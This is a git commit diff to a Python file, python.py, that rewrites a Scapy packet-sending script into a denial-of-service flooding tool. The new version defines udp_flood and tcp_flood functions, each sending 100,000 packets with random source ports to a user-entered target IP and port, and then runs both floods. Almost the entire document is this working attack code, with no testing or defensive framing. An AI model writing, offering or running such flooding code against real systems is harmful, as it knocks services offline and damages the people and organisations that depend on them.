a41ac6c63a9a7c39ae2f9c1e79d4f5f98d999719
Tabish M <110502581+tahseerxd@users.noreply.github.com>
2023-03-05 00:18:34 +0500

    Update python.py

--- python.py
+++ python.py
@@ -1,14 +1,22 @@
 from scapy.all import *
-import random
 
-# Prompt the user to enter an IP address and port number
-ip = input("Enter the IP address to send packets to: ")
-port = int(input("Enter the port number to send packets to: "))
+def udp_flood(target_ip, target_port):
+    src_port = RandShort()
+    payload = "X" * 128
+    packet = IP(dst=target_ip)/UDP(dport=target_port, sport=src_port)/payload
+    send(packet*100000, verbose=0)
 
-# Generate random data to send in each packet
-packet_data = ''.join(random.choices(string.ascii_uppercase + string.digits, k=1024))
+def tcp_flood(target_ip, target_port):
+    src_port = RandShort()
+    payload = "X" * 128
+    packet = IP(dst=target_ip)/TCP(dport=target_port, sport=src_port)/payload
+    send(packet*100000, verbose=0)
 
-# Send 100000 UDP packets to the destination IP and port
-for i in range(100000):
-    packet = IP(dst=ip) / UDP(dport=port) / packet_data
-    send(packet)
+target_ip = input("Enter target IP address: ")
+target_port = int(input("Enter target port: "))
+
+print("Sending UDP flood...")
+udp_flood(target_ip, target_port)
+
+print("Sending TCP flood...")
+tcp_flood(target_ip, target_port)
